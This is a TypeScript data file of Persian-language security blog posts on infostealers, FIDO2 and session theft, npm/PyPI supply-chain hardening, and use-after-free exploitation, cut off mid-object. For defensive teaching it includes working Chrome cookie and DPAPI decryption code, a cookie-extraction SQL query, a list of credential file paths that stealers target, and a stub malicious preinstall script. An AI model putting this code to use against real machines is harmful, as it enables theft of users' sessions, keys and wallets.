import { getStoredToken } from "./authSync";

export interface BlogSectionItem {
  id: string;
  heading: string;
  paragraphs: string[];
  codeSnippet?: string;
  codeLanguage?: string;
  callout?: string;
  calloutType?: "warning" | "info" | "tip";
  table?: {
    headers: string[];
    rows: string[][];
  };
}

export interface BlogPost {
  id: string;
  title: string;
  subtitle: string;
  slug: string;
  summary: string;
  category: "استیلر و بدافزار" | "دفاع و هاردنینگ" | "هویت و سشن‌ها" | "تحقیقات زیرودی" | string;
  readTime: string;
  date: string;
  updatedAt?: string;
  author: string;
  authorRole: string;
  difficulty: "مقدماتی" | "متوسط" | "پیشرفته" | "تخصصی (Deep-Dive)";
  tags: string[];
  status: "published" | "draft";
  isFeatured: boolean;
  views: number;
  relatedChapterId?: string;
  tldr: string[];
  content: {
    intro: string;
    sections: BlogSectionItem[];
    conclusion: string;
    actionableTakeaways: string[];
    references?: { title: string; url: string }[];
  };
}

export interface NewsSectionItem {
  heading: string;
  paragraphs: string[];
  codeSnippet?: string;
  codeLanguage?: string;
  callout?: string;
}

export interface NewsIoC {
  type: "SHA-256" | "Domain/C2" | "Process/Command" | "File Path" | "YARA/Rule" | string;
  value: string;
  description: string;
}

export interface NewsArticle {
  id: string;
  slug: string;
  title: string;
  subtitle: string;
  category: "urgent" | "malware" | "zeroday" | "apt" | "cloud";
  categoryLabel: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "INFO";
  status: "published" | "draft";
  isBreaking: boolean;
  date: string;
  readTime: string;
  author: string;
  source: string;
  views: number;
  cveIds: string[];
  cvssScore?: string;
  affectedProducts: string[];
  exploitStatus: string;
  summary: string;
  keyHighlights: string[];
  sections: NewsSectionItem[];
  iocs: NewsIoC[];
  mitigationSteps: string[];
  timeline: { time: string; event: string }[];
  tags: string[];
}

export const DEFAULT_BLOG_POSTS: BlogPost[] = [
  {
    id: "post-1",
    title: "کالبدشکافی عمیق بدافزارهای استیلر مدرن: RedLine، LummaC2 و تکنیک‌های دور زدن App-Bound Encryption",
    subtitle: "چگونه بدافزارهای سرقت اطلاعات در کمتر از ۴۵ ثانیه پایگاه‌داده SQLite مرورگرها، کلیدهای DPAPI، نشست‌های تلگرام و کیف‌پول‌های رمزارز را استخراج می‌کنند؟",
    slug: "modern-infostealers-anatomy-redline-lumma-dpapi",
    summary:
      "بررسی مهندسی معکوس و گام‌به‌گام نحوه استخراج پسوردها، سشن کوکی‌های مرورگرهای کرومیوم، دور زدن رمزنگاری App-Bound در کروم ۱۲۷ به بالا و سرقت نشست‌های فعال تلگرام و دیسکورد.",
    category: "استیلر و بدافزار",
    readTime: "۱۲ دقیقه",
    date: "۱۴ مهر ۱۴۰۴",
    author: "تیم تحلیل بدافزار و تهدیدات رهام",
    authorRole: "Roham Threat Research Labs",
    difficulty: "تخصصی (Deep-Dive)",
    tags: ["Infostealer", "LummaC2", "RedLine", "DPAPI", "App-Bound Encryption", "Session Hijacking"],
    status: "published",
    isFeatured: true,
    views: 3420,
    relatedChapterId: "chapter-1",
    tldr: [
      "استیلرهای مدرن بر خلاف باج‌افزارها به دنبال ماندگاری طولانی نیستند؛ کل عملیات جمع‌آوری، فشرده‌سازی و ارسال داده به سرور C2 زیر ۴۵ ثانیه رخ می‌دهد.",
      "کوکی‌های نشست (Session Cookies) به دلیل دور زدن کامل احراز هویت دومرحله‌ای (2FA)، ارزشمندترین دارایی سرقت‌شده توسط LummaC2 و StealC هستند.",
      "مکانیزم جدید App-Bound Encryption در کروم با وجود افزایش امنیت، توسط استیلرهای نسل جدید از طریق تزریق به پروسه‌های دارای سطح دسترسی SYSTEM یا COM Elevation هدف قرار می‌گیرد.",
      "تنها راهکار قطعی، ترکیب ایزولاسیون فایل‌های هویتی در سطح کرنل/کاربر و استفاده از کلیدهای سخت‌افزاری مقاوم به فیشینگ و سرقت (FIDO2) است."
    ],
    content: {
      intro:
        "در اکوسیستم جرایم سایبری امروز، بدافزارهای سرقت اطلاعات (Infostealers) به ستون فقرات اولیه بیش از ۷۵ درصد نفوذهای بزرگ سازمانی و حملات باج‌افزاری تبدیل شده‌اند. مهاجمان دیگر وقت خود را صرف شکستن رمزهای عبور پیچیده نمی‌کنند؛ در عوض، با آلوده‌سازی ایستگاه کاری یک توسعه‌دهنده یا کارمند از طریق تکنیک‌هایی نظیر ClickFix، پکیج‌های مسموم یا فایل‌های نصبی جعلی، مستقیماً تصویر کاملی از هویت دیجیتال قربانی را به سرقت می‌برند.",
      sections: [
        {
          id: "sec-sqlite-lock",
          heading: "۱. معماری ذخیره‌سازی کرومیوم و دور زدن قفل فایل‌های SQLite",
          paragraphs: [
            "مرورگرهای مبتنی بر موتور Chromium (شامل Google Chrome، Microsoft Edge، Brave و Arc) اطلاعات حساس کاربر را در پروفایل محلی درون پوشه AppData\\Local نگهداری می‌کنند. دو فایل حیاتی در این مسیر عبارت‌اند از فایل Login Data (حاوی نام کاربری و پسوردهای ذخیره‌شده) و فایل Network\\Cookies (حاوی توکن‌ها و کوکی‌های نشست فعال).",
            "هر دوی این فایل‌ها پایگاه‌داده‌های رابطه‌ای با فرمت SQLite3 هستند. زمانی که مرورگر باز است، سیستم‌عامل ویندوز یک قفل انحصاری (Exclusive File Lock) روی فایل Cookies ایجاد می‌کند تا پروسه‌های دیگر نتوانند همزمان آن را بخوانند. استیلرهای پیشرفته برای دور زدن این قفل از سه تکنیک استفاده می‌کنند: کپی سایه‌ای از طریق Volume Shadow Copy، استفاده از API ویندوزی Restart Manager برای آزادسازی هندل فایل، یا تزریق مستقیم شل‌کد به درون پروسه زنده مرورگر."
          ],
          codeLanguage: "sql",
          codeSnippet:
            "-- کوئری استاندارد استیلر برای استخراج کوکی‌های احراز هویت دامنه های حساس\nSELECT host_key, name, path, encrypted_value, expires_utc, is_httponly, is_secure\nFROM cookies\nWHERE host_key LIKE '%.google.com'\n   OR host_key LIKE '%.github.com'\n   OR host_key LIKE '%.microsoftonline.com'\n   OR host_key LIKE '%.aws.amazon.com';",
          callout:
            "هشدار امنیتی: کوکی‌های دارای پرچم HttpOnly تنها در برابر اسکریپت‌های جاوااسکریپت درون صفحه (حملات XSS) محافظت می‌شوند، اما در فایل SQLite روی دیسک ذخیره شده و برای هر پروسه‌ای که با دسترسی کاربر فعلی اجرا شود قابل خواندن هستند.",
          calloutType: "warning"
        },
        {
          id: "sec-dpapi-aes",
          heading: "۲. زنجیره رمزگشایی Windows DPAPI و کلید AES-256-GCM",
          paragraphs: [
            "مقادیر ستون encrypted_value در دیتابیس کوکی‌ها و پسوردها به صورت متن خام نیستند. از نسخه ۸۰ کروم به بعد، داده‌ها با الگوریتم متقارن AES-256-GCM رمزنگاری می‌شوند. پیشوند بایت‌های رمزنگاری‌شده با عبارت v10 یا v11 شروع می‌شود که پس از آن ۱۲ بایت Nonce (IV)، متن رمزنگاری‌شده و ۱۶ بایت تگ صحت‌سنجی (Authentication Tag) قرار دارد.",
            "اما کلید اصلی AES کجاست؟ این کلید در فایلی به نام Local State در ریشه پوشه User Data به صورت Base64 ذخیره شده و با پیشوند DPAPI علامت‌گذاری شده است. از آنجا که DPAPI کلید را با نشست کاربر لاگین‌شده (User Logon Session) گره می‌زند، هر بدافزاری که تحت نام همان کاربر اجرا شود، کافی است تابع ویندوزی CryptUnprotectData را صدا بزند تا ویندوز با کمال میل کلید مستر را برایش رمزگشایی کند!"
          ],
          codeLanguage: "python",
          codeSnippet:
            "# شبه‌کد مکانیزم رمزگشایی کلید مستر توسط استیلر در محیط کاربر\nimport json, base64, win32crypt\nfrom Crypto.Cipher import AES\n\nwith open(local_state_path, 'r', encoding='utf-8') as f:\n    encrypted_key = base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:] # حذف پیشوند DPAPI\n\n# فراخوانی API بومی ویندوز با دسترسی کاربر جاری\nmaster_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]\n\n# رمزگشایی کوکی با AES-GCM\nnonce = encrypted_cookie[3:15]\nciphertext = encrypted_cookie[15:-16]\ntag = encrypted_cookie[-16:]\ncipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)\nplaintext_cookie = cipher.decrypt_and_verify(ciphertext, tag)",
          table: {
            headers: ["نسخه مکانیزم", "پیشوند بایت‌ها", "الگوریتم رمزنگاری", "نحوه محافظت کلید اصلی", "وضعیت مقاومت در برابر استیلر محیط کاربر"],
            rows: [
              ["Pre-Chrome 80", "بدون پیشوند", "مستقیم DPAPI", "نشست کاربر ویندوز", "بسیار آسیب‌پذیر (CryptUnprotectData)"],
              ["Chrome 80 - 126", "v10 / v11", "AES-256-GCM", "DPAPI در فایل Local State", "آسیب‌پذیر در برابر هر پروسه سطح User"],
              ["Chrome 127+ (App-Bound)", "v20", "AES-256-GCM / ChaCha20", "سرویس Elevation با سطح SYSTEM", "نیازمند دسترسی Admin/SYSTEM یا تزریق به مرورگر"]
            ]
          }
        },
        {
          id: "sec-app-bound",
          heading: "۳. کالبدشکافی App-Bound Encryption (پیشوند v20) و پاسخ مهاجمان",
          paragraphs: [
            "در جولای ۲۰۲۴ (نسخه ۱۲۷ کروم)، گوگل مکانیزم App-Bound Encryption را معرفی کرد. در این معماری، کلید مستر دیگر با DPAPI سطح کاربر عادی رمز نمی‌شود، بلکه توسط یک سرویس ویندوزی سطح SYSTEM (به نام Chrome Elevation Service) محافظت می‌گردد. این سرویس پیش از تحویل کلید، مسیر اجرایی و امضای دیجیتال پروسه درخواست‌کننده را بررسی می‌کند تا مطمئن شود خود مرورگر کروم درخواست را ارسال کرده است.",
            "با این حال، بررسی نمونه‌های جدید LummaC2، Rhadamanthys و StealC در آزمایشگاه تهدیدات رهام نشان می‌دهد که مهاجمان برای دور زدن پیشوند v20 به سه روش روی آورده‌اند: ۱) راه‌اندازی مرورگر در حالت Headless همراه با پرچم Remote Debugging برای استخراج کوکی از طریق پروتکل CDP؛ ۲) تزریق کد (Process Hollowing / APC Injection) به درون باینری امضاشده chrome.exe؛ و ۳) سوءاستفاده از UAC Bypass برای کسب سطح دسترسی SYSTEM."
          ],
          callout:
            "نکته دفاعی رهام: آنتی‌استیلر هوشمند رهام دقیقاً همین سه گلوگاه (پرچم‌های دیباگ مرورگر، تزریق حافظه به پروسه‌های مرورگر و دسترسی غیرمجاز به فایل‌های SQLite) را در سطح درایور و هوک‌های کاربری مسدود می‌کند.",
          calloutType: "info"
        },
        {
          id: "sec-apps-tokens",
          heading: "۴. فراتر از مرورگر: سرقت نشست‌های تلگرام، دیسکورد، کلیدهای SSH و کیف‌پول‌ها",
          paragraphs: [
            "مرورگرها تنها هدف اول هستند. یک استیلر استاندارد پس از جاروب کردن مرورگرها، بلافاصله سراغ کلاینت‌های دسکتاپ می‌رود. در نرم‌افزار Telegram Desktop، پوشه tdata حاوی فایل‌های کلید نشست است؛ اگر مهاجم این پوشه را کپی کند، بدون نیاز به رمز تایید دومرحله‌ای یا ارسال کد به گوشی قربانی، مستقیماً وارد حساب تلگرام او می‌شود.",
            "به همین ترتیب، در کلاینت Discord و Slack، توکن‌های احراز هویت در دیتابیس LevelDB نگهداری می‌شوند و در ایستگاه‌های کاری توسعه‌دهندگان، فایل‌های ~/.ssh/id_rsa، ~/.aws/credentials و فایل‌های .env پروژه‌ها در عرض چند میلی‌ثانیه استخراج و در یک آرشیو ZIP رمزدار به سرور فرماندهی (C2) یا بات تلگرامی مهاجم ارسال می‌شوند."
          ],
          codeLanguage: "bash",
          codeSnippet:
            "# مسیرهای حیاتی که در مرحله File Grabbing توسط استیلرها اسکن می‌شوند:\n%APPDATA%\\Telegram Desktop\\tdata\\key_datas\n%APPDATA%\\discord\\Local Storage\\leveldb\\*.ldb\n%USERPROFILE%\\.ssh\\id_ed25519\n%USERPROFILE%\\.aws\\credentials\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn # MetaMask"
        }
      ],
      conclusion:
        "آنتی‌ویروس‌های سنتی مبتنی بر امضا (Signature-based AV) به دلیل استفاده روزانه مهاجمان از Crypterهای چندریختی و تکنیک‌های اجرای در حافظه (Fileless PowerShell)، اغلب پس از خروج اطلاعات متوجه حضور استیلر می‌شوند. تغییر پارادایم دفاعی از «شناسایی فایل بدافزار» به «حفاظت سخت‌گیرانه از مخازن هویت و سشن‌ها» تنها راه مقابله موثر با این تهدید است.",
      actionableTakeaways: [
        "هرگز پسوردهای حساس سازمانی و دسترسی‌های ابری را در Password Manager توکار مرورگر ذخیره نکنید.",
        "فراخوانی پروسه‌های فرزند مشکوک و دسترسی پروسه‌های غیرمرورگر به مسیر Network\\Cookies و Local State را مانیتور و مسدود نمایید.",
        "کلیدهای خصوصی SSH را حتماً با Passphrase قوی رمزنگاری کرده و ترجیحاً روی توکن‌های سخت‌افزاری (YubiKey / FIDO2) نگهداری کنید.",
        "در کلاینت تلگرام و برنامه‌های پیام‌رسان، قابلیت قفل محلی (Local Passcode) را فعال کنید تا فایل‌های tdata با کلید مشتق‌شده از رمز شما رمزنگاری شوند."
      ],
      references: [
        { title: "Google Security Blog — Improving Chrome Application-Bound Encryption", url: "https://security.googleblog.com" },
        { title: "MITRE ATT&CK T1539: Steal Web Session Cookie", url: "https://attack.mitre.org/techniques/T1539/" },
        { title: "کتاب «از روز صفر تا روز صفر» — فصل اول و دوم (معماری آسیب‌پذیری‌ها)", url: "/from-day-zero-to-zero-day" }
      ]
    }
  },
  {
    id: "post-2",
    title: "چرا تایید دومرحله‌ای پیامکی و TOTP در برابر سرقت سشن بی‌اثر است؟ معماری رمزنگاری FIDO2 و Passkey",
    subtitle: "تحلیل پروتکل WebAuthn، گره‌خوردن رمزنگاری به دامنه (Origin-Binding) و راهکارهای Device-Bound Session Credentials (DBSC)",
    slug: "why-sms-2fa-fails-session-theft-fido2-dbsc",
    summary:
      "بررسی دقیق فنی شکاف میان «لحظه احراز هویت» و «طول عمر نشست»، چگونگی دور زدن Google Authenticator توسط پراکسی‌های AiTM و استیلرها، و معماری نسل جدید سشن‌های مقید به سخت‌افزار.",
    category: "هویت و سشن‌ها",
    readTime: "۹ دقیقه",
    date: "۸ مهر ۱۴۰۴",
    author: "واحد پژوهش رمزنگاری و امنیت هویت رهام",
    authorRole: "Roham Identity & Cryptography Team",
    difficulty: "متوسط",
    tags: ["FIDO2", "Passkeys", "WebAuthn", "DBSC", "Session Hijacking", "AiTM Phishing"],
    status: "published",
    isFeatured: false,
    views: 2190,
    relatedChapterId: "chapter-3",
    tldr: [
      "احراز هویت دومرحله‌ای (2FA) فقط در «دروازه ورود» بررسی می‌شود؛ پس از صدور کوکی سشن، سرور در هر درخواست بعدی فقط کوکی را چک می‌کند.",
      "کدهای ۶ رقمی پیامکی و نرم‌افزارهای Authenticator در برابر حملات Adversary-in-the-Middle (مانند Evilginx) و بدافزارهای استیلر کاملاً آسیب‌پذیر هستند.",
      "استاندارد FIDO2/Passkey با امضای چالش رمزنگاری بر اساس دامنه دقیق سایت (Origin) فیشینگ را به طور کامل خنثی می‌کند.",
      "استاندارد نوظهور DBSC (Device-Bound Session Credentials) کلید سشن را نیز درون تراشه TPM قفل می‌کند تا حتی در صورت سرقت کوکی، مهاجم نتواند از آن استفاده کند."
    ],
    content: {
      intro:
        "یکی از رایج‌ترین تصورات غلط در میان مدیران فناوری اطلاعات و حتی برخی کارشناسان امنیت این است که «چون روی حساب‌های سازمانی Google Authenticator یا پیامک دومرحله‌ای فعال کرده‌ایم، حساب‌های ما غیرقابل نفوذ هستند». در واقعیت، بیش از ۷۰ درصد حوادث نفوذ به حساب‌های ابری و سازمانی در سال گذشته روی اکانت‌هایی رخ داده که MFA روی آن‌ها فعال بوده است.",
      sections: [
        {
          id: "sec-auth-vs-session",
          heading: "۱. شکاف معماری وب: تفاوت فاز Authentication با فاز Session Management",
          paragraphs: [
            "پروتکل HTTP ذاتاً بدون حالت (Stateless) است. وقتی شما نام کاربری، رمز عبور و کد ۶ رقمی دومرحله‌ای را وارد می‌کنید، سرور هویت شما را تایید کرده و یک توکن نشست (Session Cookie یا JWT) صادر می‌کند. از آن ثانیه به بعد، تا زمانی که آن توکن منقضی نشده باشد (که در بسیاری از سرویس‌ها ۳۰ تا ۹۰ روز اعتبار دارد)، مرورگر در هر درخواست فقط همان توکن را ارسال می‌کند.",
            "وقتی بدافزار استیلر یا پراکسی معکوس مهاجم (AiTM) این کوکی صادرشده را سرقت می‌کند، دیگر نیازی به عبور مجدد از سد رمز عبور یا کد دومرحله‌ای ندارد؛ او دقیقاً در مرحله «پس از احراز هویت» ایستاده است."
          ],
          callout:
            "تشبیه مهندسی: تایید دومرحله‌ای مانند بازرسی دقیق گذرنامه در ورودی هتل است، اما کوکی سشن مانند کارت مغناطیسی اتاق است. هر فردی که کارت اتاق را از جیب شما بدزدد، بدون رد شدن از پذیرش، درِ اتاق را باز می‌کند.",
          calloutType: "info"
        },
        {
          id: "sec-fido2-flow",
          heading: "۲. چگونه FIDO2 و WebAuthn فیشینگ و سرقت اعتبارنامه را متوقف می‌کنند؟",
          paragraphs: [
            "در استاندارد FIDO2 (پیاده‌سازی‌شده به صورت Passkey یا کلیدهای سخت‌افزاری YubiKey)، هیچ راز مشترکی (Shared Secret) بین کاربر و سرور رد و بدل نمی‌شود. هنگام ثبت‌نام، یک جفت کلید نامتقارن (ECDSA P-256 یا Ed25519) درون تراشه امن دستگاه (TPM یا Secure Enclave) تولید می‌شود.",
            "در زمان ورود، سرور یک عدد تصادفی یک‌بارمصرف (Challenge) می‌فرستد. مرورگر این چالش را به همراه نام دامنه واقعی (Origin) به ماژول سخت‌افزاری می‌دهد تا امضا شود. حتی اگر کاربر فریب خورده و وارد دامنه فیشینگ بسیار مشابه شود، امضای تولیدشده برای دامنه جعلی خواهد بود و سرور اصلی آن را رد می‌کند."
          ],
          codeLanguage: "javascript",
          codeSnippet:
            "// ساختار داده ClientDataJSON در پروتکل WebAuthn که به دامنه مقید می‌شود:\n{\n  \"type\": \"webauthn.get\",\n  \"challenge\": \"dGhpcyBpcyBhIHRlc3QgY2hhbGxlbmdl\",\n  \"origin\": \"https://accounts.roham.sec\",\n  \"crossOrigin\": false\n}"
        },
        {
          id: "sec-dbsc-future",
          heading: "۳. حلقه گمشده: استاندارد Device-Bound Session Credentials (DBSC)",
          paragraphs: [
            "اگرچه Passkey جلوی سرقت پسورد و فیشینگ در لحظه لاگین را می‌گیرد، اما اگر پس از لاگین، کوکی سشن توسط استیلر دزدیده شود چه؟ اینجاست که پروتکل جدید DBSC وارد میدان می‌شود.",
            "در معماری DBSC، سرور به جای صدور یک کوکی بلندمدت، یک کوکی بسیار کوتاه‌عمر (مثلاً ۵ دقیقه‌ای) صادر می‌کند و آن را به یک کلید خصوصی داخل تراشه TPM سیستم کاربر گره می‌زند. هر ۵ دقیقه، مرورگر برای تمدید کوکی مجبور است چالش سرور را با کلید داخل TPM امضا کند. از آنجا که استیلر نمی‌تواند کلید خصوصی را از تراشه سخت‌افزاری TPM خارج کند، کوکی سرقت‌شده روی سیستم مهاجم ظرف چند دقیقه از کار می‌افتد!"
          ]
        }
      ],
      conclusion:
        "گذر از پیامک و کدهای TOTP به سمت کلیدهای FIDO2 و معماری سشن‌های مقید به دستگاه (Device-Bound)، مهم‌ترین ارتقای امنیتی دهه اخیر برای حفاظت از هویت کاربران و مدیران سیستم است.",
      actionableTakeaways: [
        "احراز هویت پیامکی (SMS 2FA) را برای تمامی حساب‌های مدیریتی و زیرساختی غیرفعال کنید.",
        "برای ادمین‌های سرور، گیت‌هاب و پنل‌های ابری، کلیدهای سخت‌افزاری FIDO2 یا Passkey مبتنی بر TPM را اجباری نمایید.",
        "سیاست Continuous Access Evaluation (ارزیابی مستمر نشست بر اساس تغییر IP و Fingerprint دستگاه) را در SSO سازمان فعال کنید."
      ]
    }
  },
  {
    id: "post-3",
    title: "امن‌سازی ایستگاه کاری توسعه‌دهندگان در برابر حملات زنجیره تامین، پکیج‌های مسموم npm/PyPI و تروجان‌های Git",
    subtitle: "چگونه اسکریپت‌های preinstall و مخازن جعلی، لپ‌تاپ برنامه‌نویسان را به سکوی پرش مهاجمان به شبکه داخلی تبدیل می‌کنند؟",
    slug: "developer-workstation-hardening-supply-chain-npm-pypi",
    summary:
      "راهنمای جامع مهندسی DevSecOps برای ایزولاسیون محیط توسعه، مهار اجرای کد خودکار در مدیران بسته (npm, pip, cargo) و حفاظت از فایل‌های .env و توکن‌های CI/CD.",
    category: "دفاع و هاردنینگ",
    readTime: "۱۱ دقیقه",
    date: "۲ مهر ۱۴۰۴",
    author: "تیم مهندسی امنیت و DevSecOps رهام",
    authorRole: "Roham Enterprise Security",
    difficulty: "پیشرفته",
    tags: ["Supply Chain", "DevSecOps", "npm", "PyPI", "Dependency Confusion", "Hardening"],
    status: "published",
    isFeatured: false,
    views: 1850,
    relatedChapterId: "chapter-4",
    tldr: [
      "سیستم‌های توسعه‌دهندگان معمولاً دارای دسترسی‌های گسترده به سرورهای پروداکشن، کلیدهای AWS/Cloud و مخازن سورس‌کد هستند.",
      "اجرای یک دستور ساده npm install یا pip install می‌تواند اسکریپت‌های مخرب postinstall و setup.py را بدون هیچ هشداری اجرا کند.",
      "استفاده از کانتینرهای توسعه ایزوله (DevContainers)، غیرفعال‌سازی اسکریپت‌های خودکار و حذف فایل‌های .env متن خام ضروری است."
    ],
    content: {
      intro:
        "در معماری‌های مدرن نرم‌افزاری، دیگر نیازی نیست مهاجم برای نفوذ به سرور اصلی سازمان، فایروال‌های لبه شبکه را بشکند. کافی است یک پکیج متن‌باز با نامی مشابه یکی از کتابخانه‌های مصرفی تیم توسعه (Typosquatting) یا با نسخه بالاتر از پکیج داخلی شرکت (Dependency Confusion) منتشر کند تا توسعه‌دهنده با دست خود کد مخرب را روی لپ‌تاپ خود اجرا نماید.",
      sections: [
        {
          id: "sec-postinstall-abuse",
          heading: "۱. مکانیزم اجرای کد از طریق Lifecycle Scripts در npm و PyPI",
          paragraphs: [
            "مدیران بسته مانند npm، Yarn، pnpm و pip به گونه‌ای طراحی شده‌اند که هنگام نصب یک پکیج، بتوانند کامپایلرهای بومی را اجرا کنند. در اکوسیستم نود جی‌اس، کلیدهای preinstall، install و postinstall در فایل package.json بلافاصله پس از دانلود بسته، دستورات شل دلخواه را با سطح دسترسی کاربر فعلی اجرا می‌کنند.",
            "مهاجمان در این اسکریپت‌ها معمولاً یک دستور یک‌خطی مبهم‌شده قرار می‌دهند که متغیرهای محیطی (process.env)، کلیدهای SSH و کوکی‌های مرورگر توسعه‌دهنده را جمع‌آوری و به سرور خارجی ارسال می‌کند."
          ],
          codeLanguage: "json",
          codeSnippet:
            "{\n  \"name\": \"react-crypto-utils-pro\",\n  \"version\": \"1.0.4\",\n  \"scripts\": {\n    \"preinstall\": \"node -e \\\"const os=require('os'),fs=require('fs'),https=require('https'); /* جمع‌آوری .env و کلیدهای SSH */\\\"\"\n  }\n}",
          callout:
            "با تنظیم ignore-scripts=true در فایل .npmrc سراسری، اجرای خودکار تمامی اسکریپت‌های نصب متوقف شده و بیش از ۹۰٪ حملات پکیج‌های مسموم در نطفه خفه می‌شوند.",
          calloutType: "tip"
        },
        {
          id: "sec-devcontainer-isolation",
          heading: "۲. ایزولاسیون محیط کدنویسی با DevContainers و جداسازی اسرار (.env)",
          paragraphs: [
            "اگر پروسه بیلد یا نصب پکیج مستقیماً روی سیستم‌عامل اصلی (Host OS) اجرا شود، کد مخرب به تمام فایل‌های شخصی، مرورگر و کلیدهای سیستم دسترسی دارد. اما زمانی که پروژه درون یک DevContainer یا ماشین مجازی لینوکسی محدود اجرا می‌شود، دسترسی فایل‌سیستم صرفاً به پوشه همان پروژه محدود است.",
            "علاوه بر این، نگهداری کلیدهای API و رمزهای دیتابیس به صورت متن خام در فایل .env روی دیسک یک ریسک بزرگ است. استفاده از Secret Managerها یا تزریق متغیرها در لحظه اجرا در حافظه (بدون نوشتن روی دیسک) امنیت محیط توسعه را چندین برابر می‌کند."
          ],
          codeLanguage: "bash",
          codeSnippet:
            "# ۱. غیرفعال کردن اسکریپت‌های خودکار در npm به صورت سراسری\nnpm config set ignore-scripts true\n\n# ۲. بررسی آسیب‌پذیری‌ها و تغییرات قفل وابستگی در CI/CD\nnpm ci --ignore-scripts\nnpm audit --audit-level=high"
        }
      ],
      conclusion:
        "امنیت زنجیره تامین نرم‌افزار از لپ‌تاپ برنامه‌نویس آغاز می‌شود. با محدود کردن دسترسی پکیج‌ها و جداسازی محیط اجرا، حتی در صورت دانلود یک کتابخانه آلوده، دارایی‌های سازمان مصون می‌مانند.",
      actionableTakeaways: [
        "فایل ~/.npmrc خود را با گزینه ignore-scripts=true پیکربندی کنید.",
        "کلیدهای دسترسی ابری و پروداکشن را هرگز در فایل‌های .env روی لپ‌تاپ ذخیره نکنید.",
        "از ریپازیتوری‌پراکسی‌های داخلی (مانند Nexus یا Verdaccio) همراه با سیاست اسکن خودکار پکیج‌ها بهره ببرید."
      ]
    }
  },
  {
    id: "post-4",
    title: "از کشف کرش حافظه تا اکسپلویت پایدار: کالبدشکافی آسیب‌پذیری‌های روز صفر (Zero-Day) و مکانیزم‌های دفاعی ASLR و CFI",
    subtitle: "مروری فنی بر مفاهیم بنیادین کتاب «از روز صفر تا روز صفر»، فازینگ هوشمند، Heap Grooming و زنجیره‌های ROP",
    slug: "zero-day-vulnerability-discovery-to-rop-exploit",
    summary:
      "چگونه یک باگ ساده Use-After-Free یا سرریز بافر در کدهای C/C++ به اجرای کد از راه دور تبدیل می‌شود و سیستم‌عامل‌های مدرن چطور در برابر آن مقاومت می‌کنند؟",
    category: "تحقیقات زیرودی",
    readTime: "۱۴ دقیقه",
    date: "۲۵ شهریور ۱۴۰۴",
    author: "مرکز تحقیقات آسیب‌پذیری و نشر رهام",
    authorRole: "Roham Vulnerability Research",
    difficulty: "تخصصی (Deep-Dive)",
    tags: ["Zero-Day", "Memory Corruption", "Use-After-Free", "ASLR", "ROP Chain", "Fuzzing"],
    status: "published",
    isFeatured: false,
    views: 2740,
    relatedChapterId: "chapter-2",
    tldr: [
      "آسیب‌پذیری روز صفر (0-Day) به نقصی گفته می‌شود که پیش از اطلاع سازنده یا انتشار وصله امنیتی، کشف و در حملات هدفمند استفاده شود.",
      "بیش از ۶۵٪ آسیب‌پذیری‌های بحرانی مرورگرها و سیستم‌عامل‌ها ناشی از باگ‌های ایمنی حافظه (Memory Safety) مانند Use-After-Free و Out-of-Bounds Write هستند.",
      "برای تبدیل یک کرش ساده به اکسپلویت کامل، مهاجم باید از سد مکانیزم‌های DEP/NX، ASLR، Stack Canary و Control Flow Integrity (CFI) عبور کند."
    ],
    content: {
      intro:
        "در دنیای پژوهش‌های امنیتی سطح بالا، فاصله میان پیدا کردن یک باگ که باعث بسته شدن ناگهانی برنامه (Crash) می‌شود تا نوشتن یک اکسپلویت پایدار که کنترل کامل پردازنده را به دست می‌گیرد، مرز میان یک گزارش باگ معمولی و یک سلاح سایبری روز صفر است. در کتاب مرجع «از روز صفر تا روز صفر» که به صورت کامل و دوزبانه در کتابخوان رهام در دسترس شماست، این مسیر گام‌به‌گام تشریح شده است.",
      sections: [
        {
          id: "sec-uaf-anatomy",
          heading: "۱. چرا آسیب‌پذیری Use-After-Free (UAF) محبوب‌ترین شکار محققان است؟",
          paragraphs: [
            "در زبان‌های مدیریت دستی حافظه مانند C و ++C، زمانی که یک شیء در حافظه Heap با تابع free یا delete آزاد می‌شود، اگر اشاره‌گر (Pointer) مربوط به آن صفر (NULL) نشود، به یک اشاره‌گر معلق (Dangling Pointer) تبدیل می‌گردد.",
            "اگر مهاجم بتواند بلافاصله پس از آزاد شدن آن بخش از حافظه، داده جدیدی با اندازه مشابه و با مقادیر کنترل‌شده خود در همان آدرس تخصیص دهد (تکنیک Heap Spraying / Grooming)، برنامه هنگام فراخوانی متدهای مجازی شیء قبلی (vtable)، به جای کد اصلی برنامه به آدرس دلخواه مهاجم پرش می‌کند!"
          ],
          codeLanguage: "cpp",
          codeSnippet:
            "// نمونه کلاسیک آسیب‌پذیری Use-After-Free در C++\nstruct SessionHandler {\n    virtual void process() { /* منطق عادی */ }\n};\n\nSessionHandler* handler = new SessionHandler();\ndelete handler; // حافظه آزاد شد اما اشاره‌گر handler هنوز به همان آدرس اشاره می‌کند!\n\n// مهاجم حافظه آزادشده را با داده دستکاری‌شده پر می‌کند (Heap Grooming)\nchar* attackerControlled = (char*)malloc(sizeof(SessionHandler));\nmemcpy(attackerControlled, fakeVtablePayload, sizeof(SessionHandler));\n\nhandler->process(); // پرش جریان اجرا به آدرس جعلی مهاجم (Hijacked Control Flow)!"
        },
        {
          id: "sec-aslr-rop",
          heading: "۲. تقابل اکسپلویت و دفاع: عبور از DEP و ASLR با تکنیک ROP",
          paragraphs: [
            "در گذشته، مهاجم شل‌کد خود را روی پشته (Stack) می‌نوشت و اشاره‌گر دستورالعمل (RIP/EIP) را به آن منتقل می‌کرد. با معرفی قابلیت DEP/NX (غیرقابل اجرا کردن صفحات داده)، اجرای مستقیم کد از روی Stack و Heap غیرممکن شد.",
            "در پاسخ، تکنیک برنامه‌نویسی مبتنی بر بازگشت (Return-Oriented Programming یا ROP) شکل گرفت. در ROP، مهاجم هیچ کد جدیدی تزریق نمی‌کند، بلکه تکه‌های کوچکی از کدهای موجود در کتابخانه‌های خود برنامه را که به دستور ret ختم می‌شوند (Gadgets) به هم زنجیر می‌کند. اما برای دانستن آدرس این گجت‌ها در حضور ASLR (تصادفی‌سازی چیدمان فضای آدرس)، مهاجم ابتدا نیازمند یک آسیب‌پذیری نشت اطلاعات (Info Leak) است تا آدرس پایه ماژول در حافظه را کشف کند."
          ],
          callout:
